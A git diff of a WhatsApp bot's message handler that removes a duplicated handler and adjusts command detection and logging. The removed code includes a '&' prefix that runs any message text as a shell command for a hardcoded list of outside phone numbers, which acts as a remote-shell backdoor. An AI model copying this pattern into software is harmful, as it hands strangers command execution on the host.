@@ -511,17 +511,16 @@ const upMessage = `
     }
   });
 
-  // Message handler
+  // Message handler - FIXED VERSION (REPLACES THE EXISTING ONE)
   malvin.ev.on('messages.upsert', async (mek) => {
     mek = mek.messages[0];
     if (!mek.message) return;
     
-    // ========== FIX: Skip bot's own messages ==========
+    // FIX: Skip bot's own messages
     if (mek.key.fromMe) {
       console.log('Skipping bot\'s own message');
       return;
     }
-    // ========== END FIX ==========
     
     // Fix message structure
     mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
@@ -542,12 +541,8 @@ const upMessage = `
       await malvin.readMessages([mek.key]);
     }
 
-    // Newsletter Reaction - COMPLETELY DISABLED
-    // No newsletter reactions at all
-    // const newsletterJids = ["120363421164015033@newsletter"];
-    // if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
-    //   // Do nothing - newsletter reactions disabled
-    // }
+    // Newsletter Reaction - DISABLED
+    // No newsletter reactions
     
     if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
       const jawadlike = malvin.user.id;
@@ -577,7 +572,7 @@ const upMessage = `
                  (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : 
                  (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
     const prefix = getPrefix();
-    const isCmd = body.startsWith(prefix);
+    const isCmd = body && body.startsWith(prefix);
     var budy = typeof mek.text == 'string' ? mek.text : false;
     const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
     const args = body.trim().split(/ +/).slice(1);
@@ -622,7 +617,8 @@ const upMessage = `
     // Auto React list
     const reactionsList = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '🧕', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'];
 
-    // AUTO_REACT - DISABLED by default in settings
+    // ========== IMPORTANT FIX: REMOVE AUTO-REACT RESTRICTIONS ==========
+    // AUTO_REACT - React to all messages (if enabled in config)
     if (!isReact && config.AUTO_REACT === 'true') {
       const randomReaction = reactionsList[Math.floor(Math.random() * reactionsList.length)];
       try {
@@ -637,7 +633,7 @@ const upMessage = `
       }
     }
 
-    // OWNER_REACT - DISABLED by default in settings
+    // OWNER_REACT - React when bot sends a message
     if (!isReact && senderNumber === botNumber && config.OWNER_REACT === 'true') {
       const randomReaction = reactionsList[Math.floor(Math.random() * reactionsList.length)];
       try {
@@ -652,7 +648,7 @@ const upMessage = `
       }
     }
 
-    // CUSTOM_REACT - DISABLED by default in settings
+    // CUSTOM_REACT - React with custom emojis
     if (!isReact && config.CUSTOM_REACT === 'true') {
       const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
       const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
@@ -668,7 +664,7 @@ const upMessage = `
       }
     }
 
-    // HEART_REACT - DISABLED by default in settings
+    // HEART_REACT - React with heart emojis when bot sends message
     if (!isReact && senderNumber === botNumber && config.HEART_EACT === 'true') {
       const reactions = (config.CUSTOM_REACT_EMOJIS || '❤️,🧡,💛,💚,💚').split(',');
       const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
@@ -707,7 +703,12 @@ const upMessage = `
     console.log('- Is group?', isGroup);
     console.log('- Body starts with prefix?', body?.startsWith?.(prefix));
     console.log('- Body:', body);
+    console.log('- Is command?', isCmd);
+    console.log('- Command detected:', command);
 
+    // FIXED: Remove the strict command-only check
+    // Allow MODE logic to work as before, but process commands when they exist
+    
     // FIXED LOGIC: Always allow owner, check MODE for others
     if (isRealOwner) {
       console.log('Owner access granted (always allowed)');
@@ -749,14 +750,7 @@ const upMessage = `
     console.log('- Prefix used:', prefix);
     console.log('- Full command string:', body);
 
-    // ========== FIX: Only process if it's a command ==========
-    if (!isCmd) {
-      console.log('Not a command, ignoring message');
-      return;
-    }
-    // ========== END FIX ==========
-
-    // ONLY check for commands if we should process this message
+    // ========== FIXED: Process commands when they exist ==========
     if (isCmd && cmdName) {
       // FIND THE COMMAND
       const cmd = events.commands.find((c) => 
@@ -817,361 +811,63 @@ const upMessage = `
             console.error("Failed to send error message:", sendError.message);
           }
         }
-// Message handler - FIXED VERSION
-malvin.ev.on('messages.upsert', async (mek) => {
-  mek = mek.messages[0];
-  if (!mek.message) return;
-  
-  // FIX: Skip bot's own messages
-  if (mek.key.fromMe) {
-    console.log('Skipping bot\'s own message');
-    return;
-  }
-  
-  // Fix message structure
-  mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
-    ? mek.message.ephemeralMessage.message 
-    : mek.message;
-
-  if (config.READ_MESSAGE === 'true') {
-    await malvin.readMessages([mek.key]);
-  }
-  
-  if (mek.message.viewOnceMessageV2) {
-    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
-      ? mek.message.ephemeralMessage.message
-      : mek.message;
-  }
-  
-  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
-    await malvin.readMessages([mek.key]);
-  }
-
-  // Newsletter Reaction - DISABLED
-  // No newsletter reactions
-  
-  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
-    const jawadlike = malvin.user.id;
-    const statusEmojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '👏', '🤎', '✅', '🫀', '🧡', '😶', '🥹', '🌸', '🕊️', '🌷', '⛅', '🌟', '🥺', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
-    const randomEmoji = statusEmojis[Math.floor(Math.random() * statusEmojis.length)];
-    await malvin.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key } }, { statusJidList: [mek.key.participant, jawadlike] });
-  }
-  
-  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
-    const user = mek.key.participant;
-    const text = `${config.AUTO_STATUS_MSG}`;
-    await malvin.sendMessage(user, { text: text }, { quoted: mek });
-  }
-  
-  await Promise.all([saveMessage(mek)]);
-  
-  // Initialize m variable
-  let m;
-  if (typeof m === 'undefined') {
-    m = sms(malvin, mek);
-  }
-  
-  const type = getContentType(mek.message);
-  const from = mek.key.remoteJid;
-  const body = (type === 'conversation') ? mek.message.conversation : 
-               (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : 
-               (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : 
-               (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
-  const prefix = getPrefix();
-  const isCmd = body && body.startsWith(prefix);
-  var budy = typeof mek.text == 'string' ? mek.text : false;
-  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
-  const args = body.trim().split(/ +/).slice(1);
-  const q = args.join(' ');
-  const isGroup = from.endsWith('@g.us');
-  const sender = mek.key.fromMe ? (malvin.user.id.split(':')[0]+'@s.whatsapp.net' || malvin.user.id) : (mek.key.participant || mek.key.remoteJid);
-  const senderNumber = sender.split('@')[0];
-  const botNumber = malvin.user.id.split(':')[0];
-  const pushname = mek.pushName || 'Sin Nombre';
-  const isMe = botNumber.includes(senderNumber);
-  const botNumber2 = await jidNormalizedUser(malvin.user.id);
-  const groupMetadata = isGroup ? await malvin.groupMetadata(from).catch(e => {}) : '';
-  const groupName = isGroup ? groupMetadata.subject : '';
-  const participants = isGroup ? await groupMetadata.participants : '';
-  const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
-  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
-  const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
-  const isReact = m.message.reactionMessage ? true : false;
-  
-  const reply = (teks) => { 
-    const message = `${teks}\n\n*NI MBAYA 😅*`;
-    malvin.sendMessage(from, { text: message }, { quoted: mek });
-  };
-  
-  const ownerNumbers = ["218942841878", "254740007567", "254790375710"];
-  const sudoUsers = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8") || "[]");
-  const devNumber = config.DEV ? String(config.DEV).replace(/[^0-9]/g, "") : null;
-  const creatorJids = [...ownerNumbers, ...(devNumber ? [devNumber] : []), ...sudoUsers].map((num) => num.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
-  const isCreator = creatorJids.includes(sender) || isMe;
-
-  if (isCreator && mek.text && mek.text.startsWith("&")) {
-    let code = budy.slice(2);
-    const { spawn } = require("child_process");
-    try {
-      let resultTest = spawn(code, { shell: true });
-      resultTest.stdout.on("data", data => reply(data.toString()));
-      resultTest.stderr.on("data", data => reply(data.toString()));
-    } catch (err) { reply(util.format(err)); }
-    return;
-  }
-
-  // Auto React list
-  const reactionsList = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '🧕', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'];
-
-  // ========== IMPORTANT FIX: REMOVE AUTO-REACT RESTRICTIONS ==========
-  // AUTO_REACT - React to all messages (if enabled in config)
-  if (!isReact && config.AUTO_REACT === 'true') {
-    const randomReaction = reactionsList[Math.floor(Math.random() * reactionsList.length)];
-    try {
-      await malvin.sendMessage(mek.key.remoteJid, {
-        react: { 
-          text: randomReaction, 
-          key: mek.key
-        }
-      });
-    } catch (error) {
-      console.log('Failed to send auto reaction:', error.message);
-    }
-  }
-
-  // OWNER_REACT - React when bot sends a message
-  if (!isReact && senderNumber === botNumber && config.OWNER_REACT === 'true') {
-    const randomReaction = reactionsList[Math.floor(Math.random() * reactionsList.length)];
-    try {
-      await malvin.sendMessage(mek.key.remoteJid, {
-        react: { 
-          text: randomReaction, 
-          key: mek.key
-        }
-      });
-    } catch (error) {
-      console.log('Failed to send owner reaction:', error.message);
-    }
-  }
-
-  // CUSTOM_REACT - React with custom emojis
-  if (!isReact && config.CUSTOM_REACT === 'true') {
-    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
-    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-    try {
-      await malvin.sendMessage(mek.key.remoteJid, {
-        react: { 
-          text: randomReaction, 
-          key: mek.key
-        }
-      });
-    } catch (error) {
-      console.log('Failed to send custom reaction:', error.message);
-    }
-  }
-
-  // HEART_REACT - React with heart emojis when bot sends message
-  if (!isReact && senderNumber === botNumber && config.HEART_EACT === 'true') {
-    const reactions = (config.CUSTOM_REACT_EMOJIS || '❤️,🧡,💛,💚,💚').split(',');
-    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-    try {
-      await malvin.sendMessage(mek.key.remoteJid, {
-        react: { 
-          text: randomReaction, 
-          key: mek.key
-        }
-      });
-    } catch (error) {
-      console.log('Failed to send heart reaction:', error.message);
-    }
-  }
-
-  // Check if user is banned
-  const bannedUsers = JSON.parse(fsSync.readFileSync("./lib/ban.json", "utf-8"));
-  if (bannedUsers.includes(sender)) {
-    console.log('User is banned:', sender);
-    return;
-  }
-
-  // Check if user is owner
-  const ownerFile = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8"));
-  const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
-  const isRealOwner = sender === ownerNumberFormatted || isMe || ownerFile.includes(sender);
-
-  // DEBUG: Show current mode and access
-  console.log('MODE & ACCESS DEBUG:');
-  console.log('- Sender:', sender);
-  console.log('- Is me (bot)?', isMe);
-  console.log('- Is real owner?', isRealOwner);
-  console.log('- Owner number from config:', config.OWNER_NUMBER);
-  console.log('- Owner number formatted:', ownerNumberFormatted);
-  console.log('- Config MODE:', config.MODE);
-  console.log('- Is group?', isGroup);
-  console.log('- Body starts with prefix?', body?.startsWith?.(prefix));
-  console.log('- Body:', body);
-  console.log('- Is command?', isCmd);
-  console.log('- Command detected:', command);
-
-  // FIXED: Remove the strict command-only check
-  // Allow MODE logic to work as before, but process commands when they exist
-  
-  // FIXED LOGIC: Always allow owner, check MODE for others
-  if (isRealOwner) {
-    console.log('Owner access granted (always allowed)');
-  } else {
-    console.log('Non-owner detected, checking MODE...');
-    
-    if (config.MODE === "private") {
-      console.log('MODE=private, non-owner blocked');
-      return;
-    }
-    if (config.MODE === "inbox" && isGroup) {
-      console.log('MODE=inbox, group message from non-owner blocked');
-      return;
-    }
-    if (config.MODE === "groups" && !isGroup) {
-      console.log('MODE=groups, private message from non-owner blocked');
-      return;
-    }
-    console.log('Non-owner access granted (allowed by MODE)');
-  }
-
-  // LOAD EVENTS
-  const events = require('./malvin');
-
-  // DEBUG: Check events module
-  console.log('Events module loaded:', {
-    hasCommands: Array.isArray(events.commands),
-    commandCount: events.commands?.length || 0,
-    firstFewCommands: events.commands?.slice(0, 3)?.map(c => c.pattern || c.alias?.[0]) || []
-  });
-
-  const cmdName = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : false;
-
-  // DEBUG: Command detection
-  console.log('COMMAND DETECTION:');
-  console.log('- Is command?', isCmd);
-  console.log('- Command name:', cmdName);
-  console.log('- Args:', args);
-  console.log('- Prefix used:', prefix);
-  console.log('- Full command string:', body);
-
-  // ========== FIXED: Process commands when they exist ==========
-  if (isCmd && cmdName) {
-    // FIND THE COMMAND
-    const cmd = events.commands.find((c) => 
-      c.pattern === cmdName || 
-      (c.alias && c.alias.includes(cmdName))
-    );
-
-    if (cmd) {
-      console.log(`Command found: ${cmdName}`);
-      
-      if (cmd.react) {
-        try {
-          await malvin.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
-        } catch (error) {
-          console.log('Failed to send command reaction:', error.message);
-        }
-      }
-      
-      try {
-        const isOwner = isCreator;
-        
-        await cmd.function(malvin, mek, m, {
-          from, 
-          quoted: mek,
-          body, 
-          isCmd, 
-          command: cmdName, 
-          args, 
-          q, 
-          text: body,
-          isGroup, 
-          sender, 
-          senderNumber, 
-          botNumber2, 
-          botNumber, 
-          pushname, 
-          isMe, 
-          isOwner,
-          isCreator, 
-          groupMetadata, 
-          groupName, 
-          participants, 
-          groupAdmins, 
-          isBotAdmins, 
-          isAdmins, 
-          reply
-        });
-        console.log(`Command executed successfully: ${cmdName}`);
-      } catch (e) { 
-        console.error("[PLUGIN ERROR] " + e); 
-        console.error("Stack:", e.stack);
-        
-        try {
-          await malvin.sendMessage(from, {
-            text: `Error executing command: ${e.message}`
-          }, { quoted: mek });
-        } catch (sendError) {
-          console.error("Failed to send error message:", sendError.message);
-        }
+      } else {
+        console.log(`Command not found: ${cmdName}`);
+        // Optional: Send "command not found" message
+        // await malvin.sendMessage(from, { text: `Command "${cmdName}" not found. Type .menu for available commands.` }, { quoted: mek });
       }
     } else {
-      console.log(`Command not found: ${cmdName}`);
-      // Optional: Send "command not found" message
-      // await malvin.sendMessage(from, { text: `Command "${cmdName}" not found. Type .menu for available commands.` }, { quoted: mek });
+      console.log('Not a command or no command name');
+      // If it's not a command, just ignore it (won't respond/react)
     }
-  } else {
-    console.log('Not a command or no command name');
-    // If it's not a command, just ignore it (won't respond/react)
-  }
 
-  // Process command.on events
-  events.commands.forEach(async (command) => {
-    const tools = {
-      from, l, 
-      quoted: mek,
-      body, 
-      isCmd, 
-      command: cmdName, 
-      args, 
-      q, 
-      text: body,
-      isGroup, 
-      sender, 
-      senderNumber, 
-      botNumber2, 
-      botNumber, 
-      pushname, 
-      isMe, 
-      isOwner: isCreator,
-      isCreator, 
-      groupMetadata, 
-      groupName, 
-      participants, 
-      groupAdmins, 
-      isBotAdmins, 
-      isAdmins, 
-      reply
-    };
-    
-    if (body && command.on === "body") {
-      console.log(`Processing command.on="body": ${command.pattern || command.alias?.[0]}`);
-      await command.function(malvin, mek, m, tools);
-    } else if (mek.q && command.on === "text") {
-      console.log(`Processing command.on="text": ${command.pattern || command.alias?.[0]}`);
-      await command.function(malvin, mek, m, tools);
-    } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
-      console.log(`Processing command.on="image": ${command.pattern || command.alias?.[0]}`);
-      await command.function(malvin, mek, m, tools);
-    } else if (command.on === "sticker" && mek.type === "stickerMessage") {
-      console.log(`Processing command.on="sticker": ${command.pattern || command.alias?.[0]}`);
-      await command.function(malvin, mek, m, tools);
-    }
+    // Process command.on events
+    events.commands.forEach(async (command) => {
+      const tools = {
+        from, l, 
+        quoted: mek,
+        body, 
+        isCmd, 
+        command: cmdName, 
+        args, 
+        q, 
+        text: body,
+        isGroup, 
+        sender, 
+        senderNumber, 
+        botNumber2, 
+        botNumber, 
+        pushname, 
+        isMe, 
+        isOwner: isCreator,
+        isCreator, 
+        groupMetadata, 
+        groupName, 
+        participants, 
+        groupAdmins, 
+        isBotAdmins, 
+        isAdmins, 
+        reply
+      };
+      
+      if (body && command.on === "body") {
+        console.log(`Processing command.on="body": ${command.pattern || command.alias?.[0]}`);
+        await command.function(malvin, mek, m, tools);
+      } else if (mek.q && command.on === "text") {
+        console.log(`Processing command.on="text": ${command.pattern || command.alias?.[0]}`);
+        await command.function(malvin, mek, m, tools);
+      } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
+        console.log(`Processing command.on="image": ${command.pattern || command.alias?.[0]}`);
+        await command.function(malvin, mek, m, tools);
+      } else if (command.on === "sticker" && mek.type === "stickerMessage") {
+        console.log(`Processing command.on="sticker": ${command.pattern || command.alias?.[0]}`);
+        await command.function(malvin, mek, m, tools);
+      }
+    });
   });
+
+  // REMOVED THE DUPLICATE MESSAGE HANDLER CODE THAT WAS HERE
 });
-}
 
 // Express routes
 app.use(express.static(path.join(__dirname, "lib")));
